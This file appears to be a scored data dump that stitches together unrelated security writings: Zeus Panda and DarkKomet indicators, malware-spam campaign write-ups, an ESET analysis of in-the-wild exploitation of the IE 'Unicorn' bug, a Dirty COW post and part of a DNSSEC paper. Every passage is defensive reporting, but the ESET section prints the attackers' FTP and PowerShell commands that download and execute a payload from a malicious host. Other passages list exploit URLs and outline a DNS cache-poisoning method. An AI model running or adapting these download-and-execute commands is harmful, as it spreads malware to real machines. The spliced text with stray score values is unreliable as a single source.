hxxp://serrtretrerrtret.xyz
hxxp://serrtretretreggg.xyz
hxxp://serregergergetrgg.xyz
hxxp://sgriohsiegrhisgehsdkiga.xyz
hxxp://ewfihwfehiiwfhowfowfwfwfihfwhwffjwfjbfwjbkfw.xyz
hxxp://wghjsfgrhjsipgjsrg.xyz
hxxp://fdshdiufsbuibnjosdnvjobsdbiyhvsbibdnjvosfnos.xyz
hxxp://fdkgfkdklcdjfgkcdjfgklgdjkfldjgkldfjgkjd.xyz
hxxp://rgeifjkarhfraekjghjk.xyz
hxxp://dfkjkhsjkfhjkshdfjkhsdfkjhsfjbjkbsvksdkj.xyz
hxxp://dfkjgldkfjgkldfjglkdlkfjgkldfldjfgkldfjk.xyz
hxxp://ytvcrexrwrecvfbgnhhnbjvhrvfhbgnuhnybjvhfjbgn.xyz
hxxp://dfkjgldkfjgkldfjglkdlkfjgkldfldjfgkldfjkldfj.xyz
hxxp://ytvcrexrwrecvfbgnhhnbjvhrvfhbgnuhnybjvhf.xyz
hxxp://dfkjkhsjkfhjkshdfjkhsdfkjhsfjbjkbsvksdkjbvkj.xyz
hxxp://doishdjsdjbsdgfiysgdfiysgdfigsdigfisdgfs.xyz
Zeus Panda C&C",0.020498038559493836
"hxxp://novgeo.online
Zeus Panda ATS",0.008827588126990804
"hxxps://alvijob.website
Zeus Panda Samples (SHA1)",0.014930875377938246
"ccf17e27c0e5883920bb6abea5bc5d6c2c7a1c37
2e8598b7dc46871355b615206bd3c5f47235a835
",0.011167638148578685
Ebola Spreads - In Cyber Attacks Too,0.012297411121617197
"The Ebola virus has been spreading in West Africa since first appearing in Guinea in December, 2013. Its rising rate of infection, high mortality rate, and challenging isolation and containment requirements have raised world-wide alarm.
Against that backdrop, Websense® Security Labs has found two distinct malicious campaigns that take advantage of the Ebola issue, and it's probably safe to assume that the topic will continue to be abused in the future.
DarkKomet RAT/Backdoor Campaign
Beginning October 10, 2014, Websense® ThreatSeeker® Intelligence Cloud has detected thousands of malicious emails taking advantage of the Ebola topic. The subject line is:",0.015512795594684547
Subject: Ebola Safety Tips-By WHO,0.015001937777708974
"At the beginning of the campaign, the messages contained a redirect URL that led victims to a download location for a RAR archive. The archive contained the DarkKomet RAT/Backdoor. DarkKomet is a Remote Administration Tool (RAT) that provides full access to remote clients. It is used by attackers to control the victim's computer and steal information. In more recent emails, the campaign evolved to include direct attachment of executables, and then to direct attachment of a RAR archive containing the executable. The sample below shows the RAR attachment variant.",0.012834419835830446
"The malware in this campaign contacted a server located in Romania: 5.254.112.46:1604
ThreatScope has identified malware samples as malicious. Here are two file variants in the campaign:
SHA1 : e2bdede8375da63998562f55a77d4b078d3b5646     ThreatScope Analysis Report : Link
SHA1 : 91ff874eb5bde1bb6703e01d7603d3126ddd01fc       ThreatScope Analysis Report : Link
CVE-2014-4114 & CVE-2014-6352 - Windows OLE Remote Code Execution Vulnerabilities
On October 14, 2014, iSIGHT discovered vulnerability CVE-2014-4114, used in the Sandworm campaign that targeted NATO, the European Union, and members of the Telecommunications and Energy sectors. CVE-2014-4114 can allow remote code execution if a user opens a specially crafted Microsoft Office file containing an OLE object. The vulnerability is in all supported releases of Microsoft Windows, excluding Windows Server 2003. Because the vulnerability does not involve memory corruption that can result in shellcode, and because it is in the category of 'design error', protection methods like DEP and ASLR are not effective. Example exploit code for CVE-2014-4114 has been spotted posted on the web. Criminal actors could potentially use it to build a vulnerable PowerPoint file to spread the malware. Also, shortly after the disclosure of CVE-2014-4114, a very similar vulnerability that also targets OLE objects, surfaced  and is described as CVE-2014-6532. While CVE-2014-4114 has been patched by Microsoft, CVE-2014-6532 still awaits a patch.
Websense® Security Labs has noticed that the Ebola topic has been abused in relation to CVE-2014-4114. A sample from a third-party source, named ""Ebola in American.pps"", was leveraging CVE-2014-4114 to download and execute a payload from a remote address via the SMB protocol, which most of the time isn't allowed to connect to public Internet addresses.",0.01171458572901829
"\\220.135.249.228\public\install.inf
\\220.135.249.228\public\word.exe",0.010881808481888577
"It is possible to detect CVE-2014-6352 using Yara. Here is a Yara rule that can be run against Microsoft Office files to surface the vulnerability. The rule could use a bit of tweaking and expanding to include INF files:
rule cve_2014_6352
{
strings:
$rootentry = {52 00 6F 00 6F 00 74 00 20 00 45 00 6E 00 74 00 72 00 79 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 16 00 05 00 ff ff ff ff ff ff ff ff 01 00 00 00}
$ole10native = {4F 00 ( 4C | 6C ) 00 ( 45 | 65 ) 00 31 00 30 00 4E 00 61 00 74 00 69 00 76 00 65 00 00}
$c = ""This program cannot be run in DOS mode""
condition:
($rootentry or $ole10native) and $c
}",0.011905161732606029
"Websense customers are protected against this threat with ACE, our Advanced Classification Engine, at the different stages of the attack detailed below:",0.009258476631327839
"Stage 2 (Lure) – ACE protects against lure email messages and URLs containing the threat.
Stage 4 (Exploit) – ACE has real-time detection for exploit code that attempts to deliver the threat.
Stage 5 (Dropper) – ACE has detection for the malicious files delivered by this threat.
Stage 6 (Call Home) – ACE detects the communication to the associated C&C points associated with this threat.",0.014913271101068548
"Blog contributors: Ulysses Wang, Ran Mosessco, Nicholas Griffin.
Editor’s note: All published links found to be broken, obsolete or otherwise inactive are subsequently removed from existing entries.
",0.011861595352469556
"Sticking to their well proven social engineering tactics consisting of systematic rotation of the abused brands, cybercriminals are currently spamvertising millions of emails impersonating PayPal, in an attempt to trick end and corporate users into interacting with the malicious campaign.
Once the interaction takes place, users are exposed to the client-side exploits served by the Black Hole exploit kit, currently the market share leader within the cybercrime ecosystem.
More details:",0.01256244525508543
Screenshot of the spamvertised email:,0.01024206182675269
"Upon clicking on the link, users are exposed to bogus “Page loading…” page:",0.00859099402045771
"Spamvertised URLs: hxxp://earbudsforrunning.com/welcpp.html; hxxp://vitva-musicgroup.com/wp-content/uploads/fgallery/traninfo.html; hxxp://imune.org.br/traninfo.html
Client-side exploit serving URL: hxxp://teloexpressions.org/main.php?page=9aca5bbc34d3ebd6
Client-side exploits served: CVE-2010-0188; CVE-2010-1885
Detection rate for a sample redirection script: MD5: 2276947d2f3a7abc88e89089e65dce23
Upon successful client-side exploitation, the campaign drops MD5: 05e0958ef184a27377044655d7b23cb0 on the affected hosts, detected by 28 out of 41 antivirus scanners as Trojan.Generic.KDV.679870; Trojan-Dropper.Win32.Dapato.bnej.
Upon execution the sample phones back to a well known command and control server – 87.204.199.100/mx5/B/in/ which we’ve already seen in several previously profiled malware-serving campaigns.
As we’ve already predicted, the cybercriminal or gang of cybercriminals behind these persistent and massive spam campaigns will simply continue rotating the impersonated brands in an attempt to target millions of users across multiple Web properties.
PayPal has information on their website to help users identify legitimate emails.
Webroot SecureAnywere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.00947228654065213
"First exploitation of Internet Explorer ‘Unicorn bug’ in‑the‑wild
Microsoft released a patch last week for a critical vulnerability allowing remote code execution in Internet Explorer. This vulnerability is significant because it exploits an old bug present in Internet Explorer versions 3 through 11.",0.011760711081427733
20 Nov 2014 - 11:28AM,0.010971312017047263
Microsoft released a patch last week for a critical vulnerability allowing remote code execution in Internet Explorer. This vulnerability is significant because it exploits an old bug present in Internet Explorer versions 3 through 11.,0.012524275535374385
"Microsoft released a patch last week for a critical vulnerability allowing remote code execution in Internet Explorer. This vulnerability, known as Unicorn bug CVE-2014-6332, and discovered by an IBM X-Force security researcher, is significant because it exploits an old bug present in Internet Explorer versions 3 through 11. This means that most, if not all, Internet Explorer users are vulnerable unless they are using patched systems. It gets worse: the vulnerability not only can be used by an attacker to run arbitrary code on a remote machine, but it can also bypass the Enhanced Protected Mode (EPM) sandbox in IE11 as well as Microsoft’s free anti-exploitation tool, the Enhanced Mitigation Experience Toolkit (EMET).",0.010875518185328392
"Earlier this week, a proof-of-concept (PoC) successfully exploiting this vulnerability on Internet Explorer was made publicly available. In fact, this PoC showed that arbitrary code could be run on a machine merely by visiting a specially crafted website, if using an unpatched version of Internet Explorer. It was thus only a matter of time before we started seeing this vulnerability actively used as part of a cybercriminal campaign. Scouring our data, we found several blocked exploitation attempts while our users were browsing a major Bulgarian website. As you might have guessed, the compromised website was using CVE-2014-6332 to install malware on the computers of its unsuspecting visitors.",0.012725615839229598
Compromised Website details,0.009442792181141746
"This news agency website, ranked among the 50 most visited websites in Bulgaria and among the 11,000 first worldwide according to Alexa, might just be part of the first significant in-the-wild use of this vulnerability. As far as we can tell, there is only one page on the website that has been compromised and is serving this exploit, possibly indicating a testing phase. The page is about some TV Reality show winners.",0.010135873227920422
The page source contains an invisible HTML iframe pointing to the exploit:,0.0048694116968536205
"As seen above, the exploit is hosted on the domain natmasla[.]ru. It is detected by ESET as Win32/Exploit.CVE-2014-6332.A.",0.009051277067359198
The exploit is based on proof-of-concept code published by a Chinese researcher. Here are the credits in this original proof-of-concept:,0.011963956905115647
It is easily modifiable and allows the attacker to write the payload in VBScript.,0.00692424428088223
"Strangely, the exploit is actually present two times consecutively. The first time, the payload is:",0.011494809153389185
"cd %TEMP%&
@echo open carolinasregion.org>%TEMP%\KdFKkDls.txt&
@echo vbs@carolinasregion.org>>%TEMP%\KdFKkDls.txt&
@echo [REDACTED]>>%TEMP%\KdFKkDls.txt&
@echo binary>>%TEMP%\KdFKkDls.txt&
@echo get natmasla.exe>>%TEMP%\KdFKkDls.txt&
@echo ! natmasla.exe>>%TEMP%\KdFKkDls.txt&
@echo ! del natmasla.exe>>%TEMP%\KdFKkDls.txt&
@echo bye>>%TEMP%\KdFKkDls.txt&
ftp -s:%TEMP%\KdFKkDls.txt&
del %TEMP%\KdFKkDls.txt",0.01824826398604984
"It is basically a series of commands that will be executed in the context of cmd.exe. The first group, prefixed by @echo, will write the commands in a text file (“KdFKkDls.txt”, but the name is different each time one pulls the exploit). Then the file is passed to the ftp command. It will connect to an ftp server with a username/password, download a binary, and execute it.
In the second case, the payload is:",0.012263159203526719
"powershell.exe (New-Object System.Net.WebClient).DownloadFile('hxxp://natmasla[.]ru/ath/sploit/natmasla.exe','%TEMP%\natmasla.exe');(New-Object -com Shell.Application).ShellExecute('%TEMP%\natmasla.exe')",0.012180388235447648
"This time it uses PowerShell to download a binary payload, which is actually the same as the one downloaded by the first payload.",0.012142657457446693
"During our investigation we observed some network difficulties when we tried to fetch the exploit. That could be the reason for the two payloads with different network resources.
The downloaded binary is detected by ESET as Win32/IRCBot.NHR. This malware has numerous capabilities, as launching DDoS attacks, or opening remote shells for the miscreants. As a funny fact, it contains an Einstein’s citation “Anyone who has never made a mistake has never tried anything new.”",0.00770228081621005
Conclusion,0.008171308922719556
"Although we were not able to link this particular incident to a known exploit kit, it is a matter of time before mainstream kits integrate this vulnerability. Since all supported versions of Windows were vulnerable to this exploit before the patch was released last week, we can expect this vulnerability conversion rate to be very high. If you haven’t updated Internet Explorer yet, please take time do it right now through Windows Update.",0.01242946610724538
Hashes,0.008943721272284266
SHA1ESET Detection Name,0.011739962164462825
"825C4F203659AF27356CBEC8E1DA46C259DD962CWin32/IRCBot.NHR
",0.009488593097571663
"Mobile Menace Monday: How dare that rootin’ Dirty COW
If you follow cybersecurity news, you may have heard of the latest Linux exploit referenced under CVE-2016-5195, which has been dubbed Dirty COW. The name is derived based on the exploitation of the copy-on-write (COW) mechanism in Linux. The exploit allows an unprivileged user on a Linux system to gain increased privileges.
Why are we talking about Linux here?
As you may already know, the Android OS is based on Linux; thus, the first question on many mobile researcher’s minds when Dirty COW came to light was does it affect Android devices? The answer to that is YES, and is answered by NowSecure researcher Sergi Àlvarez i Capilla in his blog, The Dirty COW Droid. The blog comes complete with a proof-of-concept (PoC) that gains root privileges on an Android device using the exploit.
Oh no! Does MBAM Mobile protect me?
As with any exploit, whether it is Linux-based trickling down to the Android OS or one directly exploiting Android, no app can create a patch/fix. Not even a security app like MBAM Mobile. It is up to Google to push an update to Android devices to fix this issue.
We will, however, protect against any moolicious… er… malicious apps that try to use such exploits.
More about app patches
To reiterate, no app can create a patch/fix for an exploit on Android.  So if you see an app claiming to be a patch for Dirty COW or another Android exploit, there is a good chance it is malware. Don’t be fooled, and refrain from installing such apps especially if it is found on a third-party app store.
Make that moolah
The discovery of exploits like these are rare, and as you can image they tend to be hyped when they do come around. With Dirty COW, someone took “hype” to the level of “Udder madness!” by creating a webpage for the exploit with the cool domain name dirtycow.ninja along with a professionally made logo (as pictured below), a Twitter feed, and an online store to buy Dirty COW merchandise—because who wouldn’t want a Dirty COW candy jar during this upcoming holiday season. No hate from me, go make that moolah! Now excuse me while I go buy that Dirty COW t-shirt I’ve always dreamed of.",0.011965367577194796
"The Dirty Cow logo, courtesy of Dirty Cow
Nathan Collier
",0.010395220754185641
"In December, 2012, we intercepted a professional-looking email that was impersonating Facebook Inc. in an attempt to trick its users into thinking that they’ve received an “Account Cancellation Request“. In reality, once users clicked on the links, their hosts were automatically exploited through outdated and already patched client-side vulnerabilities, which dropped malware on the affected PCs.
Over the past 24 hours, cybercriminals have resumed spamvertising tens of thousands of legitimate-looking Facebook themed emails, once again using the same social engineering theme.
More details:",0.014360201655649107
Sample screenshot of the spamvertised email:,0.010990132234593664
"Malicious client-side exploitation URL chain: hxxp://mailstatic.twilightparadox.com -> hxxp://kidstoytowers.com/log/forums/index.php?showtopic=852510 -> hxxp://kidstoytowers.com/log/forums/rhin.jar -> hxxp://kidstoytowers.com/log/forums/Goo.jar -> hxxp://kidstoytowers.com/log/forums/lib.php -> hxxp://kidstoytowers.com/log/forums/load.php?showforum=lib
Sample client-side exploits served: CVE-2010-0188; CVE-2011-3544; CVE-2010-0840
Malicious domain name reconnaissance:
kidstoytowers.com – 62.75.181.220 – responding to the same IP is also the following domain – dailyfrontiernews.com
Upon successful client-side exploitation, the campaign drops MD5: 9356fcd388b4bae53cad7aea4127d966 – detected by 3 out of 46 antivirus scanners as W32/Injector.YMS!tr.
Once executed, the sample sets the following Registry Keys to 1:
HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap\ProxyBypass
HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap\IntranetName
HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap\UNCAsIntranet
HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionExplorerMountPoints2{a20cd692-8e41-11e1-9999-806d6172696f}\BaseClass
HKEY_CURRENT_USERSoftwareMicrosoftWindowsShellNoRoamMUICache(null)C:WINDOWSsystem32ipconfig.exe
It also (successfully) creates the following process:
C:d97f042474a0b1814fd681dca3ec2c5edf7054acff979f585a044478bc7c5cbd
If you catch a Facebook impersonating email in the wild, please forward it to phish@fb.com to notify Facebook of the attack. Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.00951649191003856
"Cybercriminals are currently spamvertising yet another social-engineering driven malicious email campaign, this time impersonating U.S Airways.",0.02028316381660622
"Upon clicking on the malicious links found in the emails, end and corporate users are exposed to client-side exploits courtesy of the BlackHole web malware exploitation kit.
More details:",0.013166191420415863
"Spamvertised subjects: US Airways online check-in, US Airways reservation confirmation, Confirm your US airways online reservation, US Airways online check-in confirmation
Message: You can check in from 24 hours and up to 60 minutes before your flight (2 hours if you’re flying internationally). After that, all you have to do is print your boarding pass and go to the gate. Confirmation code: 250462 Check-in online: Online reservation details
Spamvertised malicious URL: hxxp://goldapnews.pl/zh6jPwn1/index.html
Once the users click on the malicious links found in the email, an obfuscated javascript code will attempt to load from multiple compromised web servers in an attempt to redirect the users to the client-side exploits serving URL courtesy of the BlackHole web malware exploitation kit.",0.01071960504848879
Go through related posts:,0.008926389219476527
"Researchers intercept two client-side exploits serving malware campaigns
Researchers intercept a client-side exploits serving malware campaign",0.008545710078729285
"Compromised URLs, part of the campaign (the affected web sites are currently in a process of cleaning up their compromised domains, and therefore they are currently serving a HTTP/1.1 404 Not Found error message:
hxxp://alasinmedia.pp.fi/8qeXM1Kx/js.js
hxxp://boxpluss.com/00o6FfJc/js.js
hxxp://raja-sms.com/roLcnvNu/js.js
The campaign is attempting to exploit end and corporate users using the following vulnerabilities – Libtiff integer overflow in Adobe Reader and Acrobat (also known as CVE-2010-0188) and Help Center URL Validation Vulnerability (also known as CVE-2010-1885).
Client-side exploitation directory structure for the campaign:
hxxp://goldapnews.pl/zh6jPwn1/index.html – compromised legitimate web site
hxxp://66.151.244.191/showthread.php?t=73a07bcb51f4be71 – compromised game server
hxxp://66.151.244.191/data/ap2.php?f=4203d – compromised game server
IP Information for 66.151.244.191:
Resolves to v-66-151-244-191.unman-vds.internap-dallas.nfoservers.com
Hosted in the: United States
AS: AS12179, INTERNAP-2BLK Internap Network Services
According to independent sources, 66.151.244.191 was previously used as a game server, indicating a possible compromise by the cybercriminals behind this ongoing campaign.
The campaign ultimately drops the following malicious executable – MD5: 340f5884390ddcc42837078d63b6f293
Based on the campaign’s structure, it’s launched by the same gang of cybercriminals that recently launched the following campaigns “Spamvertised Verizon-themed ‘Your Bill Is Now Available’ emails lead to ZeuS crimeware” ; “Spamvertised LinkedIn notifications serving client-side exploits and malware“.
Webroot expects the gang will continue to diversifying the market segment of the brand-jacked companies, and to continue relying on the fact, that end and corporate users continue using the Web, while relying on outdated versions of their third-party software, and browser plugins.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010296037916622147
"VB2014 paper: DNSSEC: how far have we come?
2014-10-15",0.013055931998022241
"Nick Sullivan
CloudFlare
,
USA
Editor:
Martijn",0.010196592361440326
"Grooten
Abstract
In his VB2014 conference paper, Nick Sullivan explains what DNSSEC does and doesn't do to make DNS responses more trustworthy.
Copyright © 2014 Virus Bulletin",0.016599574644540094
"Abstract
DNSSEC is a set of security extensions to DNS intended to provide a root of trust for DNS records. This paper is a summary of the state of the art in DNSSEC deployment and implementation on the Internet. We start with a description of Kaminsky’s attack on DNS to motivate the need for trust in the DNS system. From here we describe some of the common arguments against DNSSEC, including NSEC and NSEC3 walking, and how DNSSEC can be an enabler for UDP reflection attacks. We then discuss useful extensions to DNSSEC, like DANE, and how these can be used to secure websites without trusting the certificate authority system. We also examine how far the effort has come in the decades since the technology was standardized, including adoption statistics and trends.",0.01482437511213719
"Introduction
The Domain Name System (DNS) is one of the oldest and most fundamental components of the modern Internet. As the mechanism that maps domain names to Internet Protocol (IP) addresses, it provides a human-readable layer to navigate the millions of machines and devices on the Internet. In the early 1980s, when DNS was designed, there was no strong need to add security mechanisms into the protocol. Computers of the time were underpowered compared with today’s machines; public key cryptography was a relatively new concept; and the network was much smaller, with fewer participants who were relatively well known and trusted. As the network grew and evolved, DNS remained pretty much unchanged as an insecure and unauthenticated protocol.
In 1995, the IETF started a public discussion around how DNS could be made more trustworthy. Eventually, a set of extensions to DNS called Domain Name System Security Extensions (DNSSEC) were settled on and formally published in 2005, replacing earlier proposals as a definitive way forward for securing DNS. Though it has been almost a decade since this publication, DNSSEC still has a long way to go to be adopted in the mainstream.
There are several catalysts pushing DNSSEC adoption, one of which is Dan Kaminsky’s cache poisoning attack from 2008 [1]. This attack highlighted the significant trust issues in traditional DNS, and how DNSSEC is well positioned to solve them. Even with the significant work going into it, there are several factors holding DNSSEC adoption back. Network operators tend to prefer stability to complexity (for good reason), and people have questioned whether DNSSEC is really the right tool for the job.
This paper presents the evolution of the state of the art in DNSSEC deployment and implementation on the Internet. We start with some background about how DNS works and where DNSSEC fits in. We will explore how standard DNS is insecure and can be exploited with Kaminsky’s attack. We describe some of the common arguments against DNSSEC, including domain enumeration with NSEC (NextSECure) and NSEC3 walking, and how DNSSEC can be an enabler for UDP reflection attacks.
We then discuss useful extensions to DNSSEC, like DANE, and how these can be used to secure websites and provide a much stronger form of trust than the certificate authority system. We also examine how far the effort has come in the decade since the technology was standardized using adoption statistics and trends.",0.020802009084078255
"DNS: a distributed key value store before it was cool
The concept of DNS is simple: it is a global database of information about domain names.
If a client wants to connect to an address such as ‘www.example.com’, and needs to know which IP address corresponds to this address, they can ask DNS. Typically, all DNS messages are sent over UDP.
There are several types of Resource Records (RR) that DNS can answer questions about. One of the most important RRs is called an A record, which stores the IPv4 address associated with the domain. To find out the value of a record for a given domain, you can get a tool called a DNS resolver to find out for you.
For example, it you wanted the IP for www.example.com, the question you could ask would be something like: ‘What is the A record for the domain www.example.com?’
The raw DNS request is a UDP packet as shown in Listing 1.
0x0000: 27e1 0100 0001 0000 0000 0000 0765 7861 ‘............exa
0x0010: 6d70 6c65 0363 6f6d 0000 0100 01 mple.com.....",0.018932301039873867
Listing 1: Raw DNS request.,0.017655611262984205
"This request contains an ID (0x27e1), some flags to indicate that it is a request, and the question itself.
The response is shown in Listing 2. The response comes with the matching ID (0x27e1), a copy of the original request echoed back, some flags (1/0/0), and an answer to the question: 93.184.216.119. It also contains a validity period, called time to live (TTL), to indicate for how long the record is valid.
0x0000: 27e1 8180 0001 0001 0000 0000 0765 7861 ‘............exa
0x0010: 6d70 6c65 0363 6f6d 0000 0100 01c0 0c00 mple.com........
0x0020: 0100 0100 0031 f500 045d b8d8 77 .....1...]..w",0.011456155960952064
Listing 2: Response.,0.014343659411243603
"The ISP typically provides a nameserver that can answer DNS requests. You can use a public nameserver like the ones provided by Google (8.8.8.8, 8.8.4.4) or OpenDNS (208.67.222.222, 208.67.220.220). If a nameserver does not have the answer, it can request it from another server, called an authoritative nameserver, to get the proper resource record. Any nameserver that is willing to query other servers for DNS answers is called a recursive nameserver.
The hierarchy of DNS is very well defined: start at the DNS root nameserver and work your way down the domain name. The top of the pyramid is a server called the root server, the source of truth for all requests (there are several root servers maintained by different organizations [2]). The root servers know the addresses of the authoritative servers for the top level domains (.com, .edu, etc.), but nothing else. If you ask the .com authoritative nameserver for www.example.com, it will return a record called SOA (start of authority), which points to the nameserver which should have more information about the requested zone.
Each of the TLD authoritative nameservers knows about the authoritative nameservers for the domains under them (example.com, cloudflare.com, google.com, etc.). Following this downward eventually gets you to the server that can answer queries about the records for the subdomain you are looking for.
Root SOA -> com authority -> SOA example.com authority -> A www.example.com
The set of DNS recursive and authoritative nameservers is one of the oldest distributed databases on the Internet. The TTL for RRs allow each server to act as a cache to help distribute the load. There are a number of different RRs that you can ask for. ‘A’ records result in IPv4 addresses, ‘AAAA’ for IPv6, ‘SOA’ for Start of Authority, and there are many more defined in various RFCs [3].",0.030312967591947126
"Kaminsky's attack
In 2008 [4], Dan Kaminsky revealed an attack on the DNS system in which you can trick a DNS recursive nameserver into storing incorrect DNS records. Once the nameserver has stored the incorrect response, it will return it to everyone who asks as long as the TTL has not expired. This so-called DNS poisoning attack could allow arbitrary people to trick DNS and redirect web browsers to incorrect servers, allowing them to hijack traffic.
The attack is simple to describe but difficult to pull off. Take the sequence of events described in the last section:
Q client -> recursive
Q recursive -> authoritative
A authoritative -> recursive
A recursive -> client
The attack relies on the fact that UDP is a stateless protocol. Each of the requests and responses described here is a single UDP request containing to and from IP addresses. If the sender of the request lies about the return address, the response is sent to the wrong place. We will get back to this when we talk about reflection/amplification attacks. The main point here is that an attacker can create a DNS request or response with a forged from address.
Of the requests above, message number 3 looks like a good target to attack. The recursive nameserver will accept the first answer to its question. If you can answer it faster than the authoritative server can, it will accept your answer as truth. This is the core of the attack:
Pick a domain whose DNS you want to hijack.
Send a request to a recursive nameserver for the record you want to poison.
Send fake UDP responses pretending to be the authoritative server with the answer of your choosing (i.e. point the A record to an IP you control).
If your malicious response arrives ahead of the real response, the recursive nameserver will believe your record and cache it for as long as the TTL is set. Then any other clients asking for the poisoned record will be directed to your malicious domain.
There are some complications that make this harder than it sounds in practice. You have to guess the request ID, and you have to guess the incoming UDP port on the recursive nameserver. When Kaminsky’s attack was originally proposed, these two values were easily guessable, making DNS poisoning a real threat. Since then, request ID and port randomization have made this specific attack more difficult to pull off, but not impossible.
The fundamental issue that allows this kind of attack to happen is that there is no way to validate that the records are what they are supposed to be.",0.02129814742155023
"DNSSEC
The security extensions to DNS add three important records that enable the entire DNS to be trusted. From a high level, DNS starts at the root nameserver and works down. This is the same way that trust is conferred via DNSSEC. The DNS root is the definitive root of trust, and a chain of trust is built to the root from any DNS entry. This is a lot like the chain of trust used to validate TLS/SSL certificates, except that, rather than many trusted root certificates, there is one trusted root key managed by the DNS root.
The point of DNSSEC is to provide a way for DNS records to be trusted by whoever receives them. The key innovation of DNSSEC is to use public key cryptography to ensure that DNS records are authentic. DNSSEC not only allows a DNS server to prove the authenticity of the records it returns, it also allows a server to assert the non-existence of records. This is established by a strict chain of records that identify either a public key or a signature of a set of resource records. The root of this chain of trust is the root key, maintained and managed by the operators of the DNS root.
There are several important new record types:
DNSKEY: a public key, used to sign RR sets.
DS: delegation signer, a hash of a key.
RRSIG: a signature of a minimal set of resource records.
A DNSKEY record is a cryptographic public key, it usually comes in two flavours:
KSK (key signing key): usually used to sign DNSKEY records only.
ZSK (zone signing key): used to sign every other type of record.
So how do these records fit together to form a chain of trust? Let’s examine first how an RRSIG record works. Each RRSIG record includes a cryptographic hash of all the records of a given type, sorted in a canonical order. It also includes a tag to help identify which DNSKEY record was used to sign it. For every record type other than DNSKEY, the RRSIG is signed with a ZSK DNSKEY. The DNSKEY is signed by the KSK. So by checking an RRSIG against the appropriate DNSKEY, you can assert that the appropriate server has signed the records and they are trusted.
How do you trust the DNSKEY? The way to do that is to walk the domain up to the next zone. To verify that the DNSKEY for example.com is valid, you have to ask the .com authoritative server. This is where the DS record comes into play. The .com zone stores the hash of the DNSKEY for each zone it knows about as a DS record. This record, like all DNSSEC records, is part of a signed set of records, and has an accompanying RRSIG signed by the .com DNSKEY. Similarly, the .com has a KSK, signing all .com DNSKEYs. So if you trust the .com keys, you can trust the example.com keys, and the A and other records obtained from the nameserver. The ultimate root of trust is the KSK DNSKEY for the DNS root. This key is universally known and published.
Here is the DNSKEY root KSK as of June 2014:
AwEAAagAIKlVZrpC6Ia7gEzahOR+9W29euxhJhVVLOyQbSEW0O8gcCjFFVQUTf6v58fLjwBd0YI0EzrAcQqBGCzh/RStIoO8g0NfnfL2MTJR
kxoXbfDaUeVPQuYEhg37NZWAJQ9VnMVDxP/VHL496M/QZxkjf5/Efucp2gaDX6RS6CXpoY68LsvPVjR0ZSwzz1apAzvN9dlzEheX7ICJBBtuA
6G3LQpzW5hOA2hzCTMjJPJ8LbqF6dsV6DoBQzgul0sGIcGOYl7OyQdXfZ57relSQageu+ipAdTTJ25AsRTAoub8ONGcLmqrAmRLKBP1dfwhYB
4N7knNnulqQxA+Uk1ihz0=",0.023817149639712598
"By following the chain of DNSKEY, DS and RRSIG records to the root, any record can be trusted.
These records are enough to prove the existence of a given resource record, but something more is needed in order to prove that a record does not exist. This is where two additional record types, NSEC and NSEC3, come into play.
Typically, a DNS authoritative server returns a flag called NXDOMAIN when a resource record definitively does not exist. In practice, this is not enough to prove that the record does not exist, since the response could be forged by a third party with no additional knowledge. NSEC works by signing the gaps between valid responses. There are a finite set of positive answers, and the gaps between positive answers are covered by NSEC. This effectively doubles the number of records in the zone, but allows an authoritative nameserver to serve a signed response for any question.
Say that .com supports NSEC records (in reality it supports NSEC3). Asking for ‘example.com’ would give you a positive answer with an IP address and an RRSIG record. Asking for ‘examplf.com’ would give you a negative answer ‘there are no zones between example.com and exampli.com’, with a corresponding RRSIG.
For NSEC3 the same logic applies, but for the hash of the record. Asking for examplf.com (e comes before f) would give you ‘there are no records with hashes between A and B’, where A is the next closest hash lexicographically before the hash of examplf.com, and B is the next closest after.",0.026260347577512166
"DNSSEC controversies
As a way to provide a system of trust for DNS records, DNSSEC works. Implementing such a large change to one of the core components of the Internet was not expected to be easy, and it has not been. Not only is there a large operational cost to implementing DNSSEC, there have been several other criticisms faced by DNSSEC over the years. In this section I will examine two major drawbacks to DNSSSEC.",0.017051291830341597
"Zone privacy
One of the major issues with the NSEC record is that it allows anyone to ‘walk’ the DNS zone. This can be used to reveal all of the domains hosted on the nameserver. Take the example of ‘examplf.com’ – the NSEC responses lets you know that ‘exampli.com’ exists. Trying an invalid record after that one such as ‘examplia.com’ will give you the next valid DNS name. This can continue until the entire zone is enumerated.
Technically, DNS records are not supposed to be secret, but in practice they are considered so. Subdomains have been used to keep things private for a while, and suddenly revealing the contents of the zone file is not expected or appreciated. This is why NSEC3 was introduced, but even it can be used to reveal the existence of subdomains.
The NSEC3 record is designed to provide authenticated denial of existence by having a signed ring of password equivalents. Rather than a signed gap of domain names for which there are no answers to the question, NSEC3 provides a signed gap of hashes of domain names. This was intended to prevent zone enumeration.
For NSEC enumeration, you can create the full list of domains by starting at a given known domain. If the zone has around 100 domains, it will take around 100 requests to enumerate the entire zone. With NSEC3, when you request a zone that does not exist, a signed NSEC3 record is returned with the next zone present ordered lexicographically by hash. By pre-computing domains that hash to the next gap of domain hashes, it should take around 100 correctly chosen queries to enumerate all the hashes. There are many tools that can do this computation for you, including a plug-in to nmap [5]. Once the hashes that correspond to all the valid subdomains of the zone are known, a dictionary attack can commence. Subdomains that have a short enough name, or are guessable using a dictionary, can be revealed as existing without having to spam the nameserver with guesses. Zone privacy is only slightly improved when using NSEC3 as designed.
This vulnerability is mitigated by a technique introduced by Dan Kaminsky known as DNSSEC White Lies [6]. When a request comes in for a domain that is not present, instead of providing an NSEC3 record of the next real domain, an NSEC3 record of the next hash lexicographically is presented. This does not break the NSEC3 guarantee that there are no domains whose hash fits lexicographically between the NSEC3 response and the question.
